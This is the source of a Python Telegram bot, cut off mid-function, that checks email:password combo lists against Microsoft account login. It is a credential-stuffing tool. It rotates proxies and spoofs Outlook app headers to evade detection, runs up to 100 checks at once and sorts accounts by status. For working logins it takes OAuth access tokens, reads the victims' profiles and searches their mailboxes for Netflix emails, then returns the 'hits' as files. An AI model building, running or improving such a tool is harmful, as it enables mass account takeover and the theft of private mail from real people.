import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import Update
import requests
import re
import uuid
from datetime import datetime
import random
import asyncio
import io
import os
import threading
from urllib.parse import parse_qs, urlparse
import json

# Get Telegram bot token from environment variable
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', 'YOUR_BOT_TOKEN_HERE')

# Microsoft/Netflix endpoints
LOGIN_URL = "https://login.live.com/ppsecure/post.srf"
TOKEN_URL = "https://login.live.com/oauth20_token.srf"
PROFILE_URL = "https://substrate.office.com/profile/v1.0/me/profile"
FOLDERS_URL = "https://outlook.office.com/api/beta/me/MailFolders"
SEARCH_URL = "https://outlook.live.com/search/api/v2/query"

# Anti-duplicate system
processed_messages = set()
message_lock = threading.Lock()

# Global storage
user_proxies = {}
user_active_counters = {}
user_thread_settings = {}

def prevent_duplicate(func):
    """Decorator to prevent duplicate message processing"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        message_key = f"{update.update_id}_{update.message.from_user.id}_{hash(update.message.text)}"

        with message_lock:
            if message_key in processed_messages:
                return  # Skip duplicate
            processed_messages.add(message_key)

            # Clean old messages periodically
            if len(processed_messages) > 500:
                processed_messages.clear()

        return await func(update, context)
    return wrapper

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()

    def add_proxy(self, proxy_string):
        """Add a proxy in format ip:port:user:pass"""
        try:
            parts = proxy_string.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{ip}:{port}',
                    'https': f'http://{username}:{password}@{ip}:{port}'
                }
                with self.lock:
                    self.proxies.append(proxy_dict)
                return True
            elif len(parts) == 2:
                ip, port = parts
                proxy_dict = {
                    'http': f'http://{ip}:{port}',
                    'https': f'http://{ip}:{port}'
                }
                with self.lock:
                    self.proxies.append(proxy_dict)
                return True
        except Exception as e:
            print(f"Error adding proxy: {e}")
        return False

    def get_next_proxy(self):
        """Get next proxy in rotation - thread safe"""
        if not self.proxies:
            return None

        with self.lock:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return proxy

    def clear_proxies(self):
        """Clear all proxies"""
        with self.lock:
            self.proxies.clear()
            self.current_index = 0

    def get_proxy_count(self):
        """Get number of proxies"""
        with self.lock:
            return len(self.proxies)

def get_user_proxy_manager(user_id):
    """Get or create proxy manager for user"""
    if user_id not in user_proxies:
        user_proxies[user_id] = ProxyManager()
    return user_proxies[user_id]

def get_user_thread_setting(user_id):
    """Get thread setting for user (default: 25 threads)"""
    return user_thread_settings.get(user_id, 25)

def set_user_thread_setting(user_id, threads):
    """Set thread setting for user - NOW SUPPORTS UP TO 100 THREADS!"""
    user_thread_settings[user_id] = max(1, min(threads, 100))  # Limit between 1-100

def increment_user_active_counter(user_id):
    """Increment active counter for user - thread safe"""
    if user_id not in user_active_counters:
        user_active_counters[user_id] = 0
    user_active_counters[user_id] += 1
    return user_active_counters[user_id]

def generate_vars():
    """Generate randomized variables for requests"""
    return {
        "client_id": "0000000048170EF2",
        "uaid": str(uuid.uuid4()).replace('-', ''),
        "contextid": str(uuid.uuid4()).replace('-', '').upper(),
        "bk": str(random.randint(1665024800, 1665024999)),
        "hpgrequestid": str(uuid.uuid4()),
        "canary": f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=32))}",
        "ppft": f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*', k=200))}"
    }

def parse_value(text, start_key, end_key):
    """Extract value between two strings"""
    try:
        start_idx = text.find(start_key)
        if start_idx == -1:
            return None
        start_idx += len(start_key)

        end_idx = text.find(end_key, start_idx)
        if end_idx == -1:
            return text[start_idx:]

        return text[start_idx:end_idx]
    except:
        return None

def extract_refresh_token(url):
    """Extract refresh token from redirect URL"""
    try:
        parsed = urlparse(url)
        fragment = parsed.fragment
        if fragment:
            params = parse_qs(fragment)
            return params.get('refresh_token', [None])[0]
        return None
    except:
        return None

async def basic_login_check(email, password, proxy_manager=None):
    """Basic login validation - only checks if credentials are valid"""
    try:
        # Generate required variables
        vars_data = generate_vars()

        # Get proxy if available
        proxy = proxy_manager.get_next_proxy() if proxy_manager else None

        with requests.Session() as session:
            # Apply proxy to session if available
            if proxy:
                session.proxies.update(proxy)

            # Step 1: Initial login request
            login_headers = {
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "X-Requested-With": "com.microsoft.office.outlook",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            }

            login_data = {
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "lrt": "",
                "lrtPartition": "",
                "hisRegion": "",
                "hisScaleUnit": "",
                "passwd": password,
                "ps": "2",
                "psRNGCDefaultType": "",
                "psRNGCEntropy": "",
                "psRNGCSLK": "",
                "canary": vars_data["canary"],
                "ctx": "",
                "hpgrequestid": vars_data["hpgrequestid"],
                "PPFT": vars_data["ppft"],
                "PPSX": "Passp",
                "NewUser": "1",
                "FoundMSAs": "",
                "fspost": "0",
                "i21": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "0",
                "isSignupPost": "0",
                "i19": "41679"
            }

            # Make login request
            login_url = f"{LOGIN_URL}?client_id={vars_data['client_id']}&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={email}&contextid={vars_data['contextid']}&bk={vars_data['bk']}&uaid={vars_data['uaid']}&pid=15216"

            response = session.post(login_url, data=login_data, headers=login_headers, timeout=30, allow_redirects=False)

            # Check for various response patterns
            response_text = response.text

            # Check for invalid credentials
            if any(pattern in response_text for pattern in [
                "Your account or password is incorrect.",
                "That Microsoft account doesn't exist. Enter a different account",
                "Sign in to your Microsoft account"
            ]):
                return {"status": "INVALID", "email": email, "password": password}

            # Check for ban
            if ",AC:null,urlFedConvertRename" in response_text:
                return {"status": "BANNED", "email": email, "password": password}

            # Check for 2FA
            if any(pattern in response_text for pattern in [
                "account.live.com/recover?mkt",
                "recover?mkt",
                "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt"
            ]):
                return {"status": "2FACTOR", "email": email, "password": password}

            # Check for other custom statuses
            if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
                return {"status": "CUSTOM", "email": email, "password": password}

            # Check for success indicators
            success_indicators = [
                "ANON" in str(session.cookies),
                "WLSSC" in str(session.cookies),
                "https://login.live.com/oauth20_desktop.srf?" in response.headers.get('Location', '')
            ]

            if any(success_indicators):
                return {"status": "VALID", "email": email, "password": password}
            else:
                return {"status": "LOGIN_FAILED", "email": email, "password": password}

    except Exception as e:
        return {"status": "ERROR", "email": email, "password": password, "error": str(e)}

async def full_netflix_check(email, password, proxy_manager=None):
    """Full Netflix account check with profile extraction and email analysis"""
    try:
        # Generate required variables
        vars_data = generate_vars()

        # Get proxy if available
        proxy = proxy_manager.get_next_proxy() if proxy_manager else None

        with requests.Session() as session:
            # Apply proxy to session if available
            if proxy:
                session.proxies.update(proxy)

            # Step 1: Initial login request
            login_headers = {
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "X-Requested-With": "com.microsoft.office.outlook",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            }

            login_data = {
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "lrt": "",
                "lrtPartition": "",
                "hisRegion": "",
                "hisScaleUnit": "",
                "passwd": password,
                "ps": "2",
                "psRNGCDefaultType": "",
                "psRNGCEntropy": "",
                "psRNGCSLK": "",
                "canary": vars_data["canary"],
                "ctx": "",
                "hpgrequestid": vars_data["hpgrequestid"],
                "PPFT": vars_data["ppft"],
                "PPSX": "Passp",
                "NewUser": "1",
                "FoundMSAs": "",
                "fspost": "0",
                "i21": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "0",
                "isSignupPost": "0",
                "i19": "41679"
            }

            # Make login request
            login_url = f"{LOGIN_URL}?client_id={vars_data['client_id']}&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={email}&contextid={vars_data['contextid']}&bk={vars_data['bk']}&uaid={vars_data['uaid']}&pid=15216"

            response = session.post(login_url, data=login_data, headers=login_headers, timeout=30, allow_redirects=False)

            # Check for various response patterns
            response_text = response.text

            # Check for invalid credentials
            if any(pattern in response_text for pattern in [
                "Your account or password is incorrect.",
                "That Microsoft account doesn't exist. Enter a different account",
                "Sign in to your Microsoft account"
            ]):
                return {"status": "INVALID", "email": email, "password": password}

            # Check for ban
            if ",AC:null,urlFedConvertRename" in response_text:
                return {"status": "BANNED", "email": email, "password": password}

            # Check for 2FA
            if any(pattern in response_text for pattern in [
                "account.live.com/recover?mkt",
                "recover?mkt",
                "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt"
            ]):
                return {"status": "2FACTOR", "email": email, "password": password}

            # Check for other custom statuses
            if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
                return {"status": "CUSTOM", "email": email, "password": password}

            # Check for success indicators
            success_indicators = [
                "ANON" in str(session.cookies),
                "WLSSC" in str(session.cookies),
                "https://login.live.com/oauth20_desktop.srf?" in response.headers.get('Location', '')
            ]

            if not any(success_indicators):
                return {"status": "LOGIN_FAILED", "email": email, "password": password}

            # Extract refresh token from redirect
            redirect_location = response.headers.get('Location', '')
            refresh_token = extract_refresh_token(redirect_location)

            if not refresh_token:
                return {"status": "NO_TOKEN", "email": email, "password": password}

            # Step 2: Get access token
            token_headers = {
                "x-ms-sso-Ignore-SSO": "1",
                "User-Agent": "Outlook-Android/2.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "login.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            token_data = {
                "grant_type": "refresh_token",
                "client_id": vars_data["client_id"],
                "scope": "https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite",
                "redirect_uri": "https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf",
                "refresh_token": refresh_token,
                "uaid": vars_data["uaid"]
            }

            token_response = session.post(TOKEN_URL, data=token_data, headers=token_headers, timeout=30)

            try:
                token_json = token_response.json()
                access_token = token_json.get('access_token')
                if not access_token:
                    return {"status": "TOKEN_FAILED", "email": email, "password": password}
            except:
                return {"status": "TOKEN_PARSE_ERROR", "email": email, "password": password}

            # Extract CID from cookies
            cid = None
            for cookie in session.cookies:
                if cookie.name == 'MSPCID':
                    cid = cookie.value.upper()
                    break

            if not cid:
                return {"status": "NO_CID", "email": email, "password": password}

            # Step 3: Get profile information
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            profile_response = session.get(PROFILE_URL, headers=profile_headers, timeout=30)

            if profile_response.status_code == 403:
                return {"status": "PROFILE_BANNED", "email": email, "password": password}

            # Extract profile data
            profile_data = {}
            try:
                profile_json = profile_response.json()
                profile_data = {
                    "name": profile_json.get('displayNameDefault', 'N/A'),
                    "country": profile_json.get('location', 'N/A')
                }
            except:
                profile_data = {"name": "N/A", "country": "N/A"}

            # Step 4: Get mail folders
            folders_headers = profile_headers.copy()
            folders_headers["Host"] = "outlook.office.com"

            folders_response = session.get(FOLDERS_URL, headers=folders_headers, timeout=30)

            folder_count = 0
            try:
                folders_json = folders_response.json()
                if 'value' in folders_json:
                    folder_count = len(folders_json['value'])
            except:
                pass

            # Step 5: Search for Netflix content
            search_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Content-Type": "application/json",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "outlook.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            search_data = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "Netflix"}
                }]
            }

            netflix_emails = 0
            try:
                search_response = session.post(SEARCH_URL, json=search_data, headers=search_headers, timeout=30)
                search_json = search_response.json()

                # Count Netflix-related emails
                if 'EntitySets' in search_json:
                    for entity_set in search_json['EntitySets']:
                        if 'Entities' in entity_set:
                            netflix_emails = len(entity_set['Entities'])
                            break
            except:
                pass

            # Determine final status
            if netflix_emails > 0:
                status = "NETFLIX_FOUND"
            elif folder_count > 0:
                status = "VALID_ACCOUNT"
            else:
                status = "SUCCESS"

            return {
                "status": status,
                "email": email,
                "password": password,
                "name": profile_data.get("name", "N/A"),
                "country": profile_data.get("country", "N/A"),
                "folder_count": folder_count,
                "netflix_emails": netflix_emails,
                "access_token": access_token[:20] + "..." if access_token else "N/A"
            }

    except Exception as e:
        return {"status": "ERROR", "email": email, "password": password, "error": str(e)}

@prevent_duplicate
async def check_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)

        # Parse user input
        message_text = update.message.text.strip()

        # Remove /check command
        if message_text.startswith('/check '):
            credentials = message_text[7:]
        else:
            await update.message.reply_text("❌ Please use format: /check email:password")
            return

        # Handle email:password format
        if ':' in credentials:
            email, password = credentials.split(':', 1)
        else:
            await update.message.reply_text("❌ Please use format: /check email:password")
            return

        # Use proxy manager if proxies are configured
        proxy_to_use = proxy_manager if proxy_manager.get_proxy_count() > 0 else None

        result = await basic_login_check(email, password, proxy_to_use)

        if result["status"] == "VALID":
            # Increment counter for this user
            counter = increment_user_active_counter(user_id)

            # Format response with HTML
            response_text = f"✅ <b>VALID #{counter}</b>\n"
            response_text += f"📧 <b>Email:</b> {result['email']}\n"
            response_text += f"🔑 <b>Password:</b> {result['password']}\n"
            response_text += f"📊 <b>Status:</b> Login Successful"

            await update.message.reply_text(response_text, parse_mode='HTML')
        else:
            status_emoji = {
                "INVALID": "❌",
                "BANNED": "🚫",
                "2FACTOR": "🔐",
                "CUSTOM": "⚠️",
                "ERROR": "💥"
            }
            emoji = status_emoji.get(result["status"], "❌")
            await update.message.reply_text(f"{emoji} <b>Status:</b> {result['status']}", parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")

@prevent_duplicate
async def combo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📁 Send me a .txt file with accounts for <b>basic login check</b> (email:password format)", parse_mode='HTML')

@prevent_duplicate
async def netflix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎬 Send me a .txt file with accounts for <b>Netflix analysis</b> (email:password format)", parse_mode='HTML')

async def process_basic_batch(accounts_batch, proxy_manager, user_id):
    """Process a batch of accounts for basic login checking with 100 thread support"""
    tasks = []
    semaphore = asyncio.Semaphore(100)  # Limit concurrent tasks to 100

    async def process_single_account(account):
        async with semaphore:
            try:
                email, password = account.split(':', 1)
                return await basic_login_check(email, password, proxy_manager)
            except Exception as e:
                return {"status": "ERROR", "email": account, "password": "", "error": str(e)}

    for account in accounts_batch:
        task = process_single_account(account)
        tasks.append(task)

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [result for result in results if isinstance(result, dict)]
    return []

async def process_netflix_batch(accounts_batch, proxy_manager, user_id):
    """Process a batch of accounts for Netflix checking with 100 thread support"""
    tasks = []
    semaphore = asyncio.Semaphore(100)  # Limit concurrent tasks to 100

    async def process_single_account(account):
        async with semaphore:
            try:
                email, password = account.split(':', 1)
                return await full_netflix_check(email, password, proxy_manager)
            except Exception as e:
                return {"status": "ERROR", "email": account, "password": "", "error": str(e)}

    for account in accounts_batch:
        task = process_single_account(account)
        tasks.append(task)

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [result for result in results if isinstance(result, dict)]
    return []

@prevent_duplicate
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)
        thread_count = get_user_thread_setting(user_id)

        # Check if this is a proxy file upload
        if update.message.caption and 'proxy' in update.message.caption.lower():
            await handle_proxy_file(update, context)
            return

        # Check if this is a Netflix analysis file
        is_netflix_check = update.message.caption and 'netflix' in update.message.caption.lower()

        # Check if document is a text file
        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please send a .txt file only")
            return

        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_bytes = await file.download_as_bytearray()

        # Parse the file content
        content = file_bytes.decode('utf-8')
        lines = content.strip().split('\n')

        # Filter valid email:password format
        accounts = []
        for line in lines:
            line = line.strip()
            if ':' in line:
                accounts.append(line)

        if not accounts:
            await update.message.reply_text("❌ No valid accounts found in the file")
            return

        proxy_count = proxy_manager.get_proxy_count()
        proxy_text = f" using {proxy_count} proxies" if proxy_count > 0 else " (no proxies)"

        if is_netflix_check:
            await update.message.reply_text(
                f"🎬 Processing {len(accounts)} accounts for <b>Netflix analysis</b> with {thread_count} threads{proxy_text}...\n"
                f"🚀 <b>ULTRA SPEED MODE:</b> Up to 100 concurrent checks!", 
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                f"🔄 Processing {len(accounts)} accounts for <b>basic login check</b> with {thread_count} threads{proxy_text}...\n"
                f"🚀 <b>ULTRA SPEED MODE:</b> Up to 100 concurrent checks!", 
                parse_mode='HTML'
            )

        valid_accounts = []
        invalid_accounts = []

        # Split accounts into batches for concurrent processing
        batch_size = min(thread_count, 100)  # Use up to 100 threads per batch
        account_batches = [accounts[i:i + batch_size] for i in range(0, len(accounts), batch_size)]

        processed_count = 0

        for batch_num, batch in enumerate(account_batches, 1):
            # Process current batch concurrently
            if is_netflix_check:
                batch_results = await process_netflix_batch(batch, proxy_manager, user_id)
            else:
                batch_results = await process_basic_batch(batch, proxy_manager, user_id)

            # Process results
            for result in batch_results:
                processed_count += 1

                if is_netflix_check:
                    # Netflix check - show detailed results
                    if result["status"] in ["NETFLIX_FOUND", "VALID_ACCOUNT", "SUCCESS"]:
                        valid_accounts.append(result)

                        # Show Netflix results in chat
                        response_text = f"✅ <b>SUCCESS #{len(valid_accounts)}</b>\n"
                        response_text += f"📧 <b>Email:</b> {result['email']}\n"
                        response_text += f"🔑 <b>Password:</b> {result['password']}\n"
                        response_text += f"👤 <b>Name:</b> {result.get('name', 'N/A')}\n"
                        response_text += f"🌍 <b>Country:</b> {result.get('country', 'N/A')}\n"
                        response_text += f"📁 <b>Folders:</b> {result.get('folder_count', 0)}\n"
                        response_text += f"🎬 <b>Netflix Emails:</b> {result.get('netflix_emails', 0)}\n"
                        response_text += f"🔐 <b>Token:</b> {result.get('access_token', 'N/A')}\n"
                        response_text += f"📊 <b>Status:</b> {result['status']}"

                        await update.message.reply_text(response_text, parse_mode='HTML')
                    else:
                        invalid_accounts.append(result)
                else:
                    # Basic login check - show simple results
                    if result["status"] == "VALID":
                        valid_accounts.append(result)

                        # Show basic login results in chat
                        response_text = f"✅ <b>VALID #{len(valid_accounts)}</b>\n"
                        response_text += f"📧 <b>Email:</b> {result['email']}\n"
                        response_text += f"🔑 <b>Password:</b> {result['password']}\n"
                        response_text += f"📊 <b>Status:</b> Login Successful"

                        await update.message.reply_text(response_text, parse_mode='HTML')
                    else:
                        invalid_accounts.append(result)

            # Progress update every 3 batches (faster updates for high-speed processing)
            if batch_num % 3 == 0 or batch_num == len(account_batches):
                estimated_speed = min(proxy_count * thread_count, 100) if proxy_count > 0 else thread_count
                await update.message.reply_text(
                    f"📊 Progress: {processed_count}/{len(accounts)} - Valid: {len(valid_accounts)} - Speed: {estimated_speed} concurrent\n"
                    f"⚡ <b>ULTRA THREADING:</b> {thread_count} threads active!"
                )

        # Create and send result files
        if is_netflix_check:
            await send_netflix_result_files(update, valid_accounts, invalid_accounts)
        else:
            await send_basic_result_files(update, valid_accounts, invalid_accounts)

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error processing file: {str(e)}")

async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded proxy file"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)

        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()

        # Parse proxy file
        proxy_text = file_content.decode('utf-8')
        proxy_lines = [line.strip() for line in proxy_text.split('\n') if line.strip()]

        added_count = 0
        for proxy_line in proxy_lines:
            if proxy_manager.add_proxy(proxy_line):
                added_count += 1

        result_text = f"✅ <b>Proxy file processed!</b>\n📊 <b>Added:</b> {added_count} proxies\n🔧 <b>Total proxies:</b> {proxy_manager.get_proxy_count()}\n"
        result_text += f"🚀 <b>Max concurrent speed:</b> {proxy_manager.get_proxy_count()} × 100 threads = {proxy_manager.get_proxy_count() * 100} requests!"
        await update.message.reply_text(result_text, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error processing proxy file: {str(e)}", parse_mode='HTML')

async def send_basic_result_files(update: Update, valid_accounts, invalid_accounts):
    """Send basic login check result files"""
    try:
        # Create valid accounts file
        valid_content = ""
        for acc in valid_accounts:
            valid_content += f"{acc['email']}:{acc['password']}\n"

        # Create invalid accounts file
        invalid_content = ""
        for acc in invalid_accounts:
            if 'password' in acc:
                invalid_content += f"{acc['email']}:{acc['password']}\n"
            else:
                invalid_content += f"{acc['email']}:unknown\n"

        # Send valid accounts file
        if valid_content:
            valid_file = io.BytesIO(valid_content.encode('utf-8'))
            valid_file.name = f"hits_ultra_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(
                document=valid_file,
                filename=valid_file.name,
                caption=f"✅ <b>Login Hits (Ultra Speed):</b> {len(valid_accounts)}",
                parse_mode='HTML'
            )

        # Send invalid accounts file
        if invalid_content:
            invalid_file = io.BytesIO(invalid_content.encode('utf-8'))
            invalid_file.name = f"dead_ultra_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(
                document=invalid_file,
                filename=invalid_file.name,
                caption=f"❌ <b>Dead Accounts (Ultra Speed):</b> {len(invalid_accounts)}",
                parse_mode='HTML'
            )

        # Send summary
        summary = f"🚀 <b>ULTRA SPEED Login Check Complete!</b>\n\n"
        summary += f"✅ <b>Valid Logins:</b> {len(valid_accounts)}\n"
        summary += f"❌ <b>Invalid Logins:</b> {len(invalid_accounts)}\n"
        summary += f"🔢 <b>Total Processed:</b> {len(valid_accounts) + len(invalid_accounts)}\n"
        summary += f"⚡ <b>Threading:</b> Up to 100 concurrent checks"

        await update.message.reply_text(summary, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error creating files: {str(e)}")

async def send_netflix_result_files(update: Update, valid_accounts, invalid_accounts):
    """Send Netflix analysis result files"""
    try:
        # Create valid accounts file
        valid_content = ""
        for acc in valid_accounts:
            valid_content += f"{acc['email']}:{acc['password']}\n"

        # Create invalid accounts file
        invalid_content = ""
        for acc in invalid_accounts:
            if 'password' in acc:
                invalid_content += f"{acc['email']}:{acc['password']}\n"
            else:
                invalid_content += f"{acc['email']}:unknown\n"

        # Send valid accounts file
        if valid_content:
            valid_file = io.BytesIO(valid_content.encode('utf-8'))
            valid_file.name = f"netflix_hits_ultra_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(
                document=valid_file,
                filename=valid_file.name,
                caption=f"🎬 <b>Netflix Hits (Ultra Speed):</b> {len(valid_accounts)}",
                parse_mode='HTML'
            )

        # Send invalid accounts file
        if invalid_content:
            invalid_file = io.BytesIO(invalid_content.encode('utf-8'))
            invalid_file.name = f"netflix_dead_ultra_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(
                document=invalid_file,
                filename=invalid_file.name,
                caption=f"❌ <b>Netflix Dead (Ultra Speed):</b> {len(invalid_accounts)}",
                parse_mode='HTML'
            )

        # Send summary
        summary = f"🎬 <b>ULTRA SPEED Netflix Analysis Complete!</b>\n\n"
        summary += f"✅ <b>Netflix Accounts:</b> {len(valid_accounts)}\n"
        summary += f"❌ <b>Dead Accounts:</b> {len(invalid_accounts)}\n"
        summary += f"🔢 <b>Total Processed:</b> {len(valid_accounts) + len(invalid_accounts)}\n"
        summary += f"⚡ <b>Threading:</b> Up to 100 concurrent checks"

        await update.message.reply_text(summary, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error creating files: {str(e)}")

@prevent_duplicate
async def set_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set number of threads for concurrent processing - NOW SUPPORTS UP TO 100 THREADS!"""
    try:
        user_id = update.message.from_user.id

        if not context.args:
            current_threads = get_user_thread_setting(user_id)
            await update.message.reply_text(
                f"📊 <b>Current thread setting:</b> {current_threads}\n\n"
                f"Usage: <code>/threads 100</code>\n"
                f"🚀 <b>ULTRA RANGE:</b> 1-100 threads\n"
                f"⚡ <b>Recommended:</b> 50-100 for maximum speed", 
                parse_mode='HTML'
            )
            return

        try:
            threads = int(context.args[0])
            if threads < 1 or threads > 100:
                await update.message.reply_text("❌ Thread count must be between 1 and 100")
                return

            set_user_thread_setting(user_id, threads)

            # Performance indicators
            if threads >= 80:
                performance_msg = "🔥 <b>ULTRA SPEED MODE</b> - Maximum performance!"
            elif threads >= 50:
                performance_msg = "⚡ <b>HIGH SPEED MODE</b> - Very fast processing!"
            elif threads >= 25:
                performance_msg = "🚀 <b>FAST MODE</b> - Good performance!"
            else:
                performance_msg = "🐢 <b>NORMAL MODE</b> - Standard speed"

            await update.message.reply_text(
                f"✅ Thread count set to <b>{threads}</b>\n"
                f"{performance_msg}\n"
                f"🔢 <b>Max concurrent:</b> {threads} simultaneous checks", 
                parse_mode='HTML'
            )

        except ValueError:
            await update.message.reply_text("❌ Please provide a valid number")

    except Exception as e:
        await update.message.reply_text(f"❌ Error setting threads: {str(e)}")

@prevent_duplicate
async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set proxy for the user"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)

        if not context.args:
            await update.message.reply_text("❌ Please provide proxy in format: /proxy ip:port:user:pass", parse_mode='HTML')
            return

        proxy_string = ' '.join(context.args)

        if proxy_manager.add_proxy(proxy_string):
            await update.message.reply_text(f"✅ Proxy added successfully! Total proxies: {proxy_manager.get_proxy_count()}", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Invalid proxy format. Use: ip:port:user:pass or ip:port", parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error setting proxy: {str(e)}", parse_mode='HTML')

@prevent_duplicate
async def clear_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all proxies for the user"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)
        proxy_manager.clear_proxies()
        await update.message.reply_text("✅ All proxies cleared!", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error clearing proxies: {str(e)}", parse_mode='HTML')

@prevent_duplicate
async def proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy and thread status for the user"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)
        thread_count = get_user_thread_setting(user_id)

        proxy_count = proxy_manager.get_proxy_count()
        status_text = f"📊 <b>ULTRA SPEED Configuration Status:</b>\n\n"
        status_text += f"🌐 <b>Proxies:</b> {proxy_count}\n"
        status_text += f"🔄 <b>Current proxy index:</b> {proxy_manager.current_index}\n"
        status_text += f"⚡ <b>Threads:</b> {thread_count}/100\n\n"

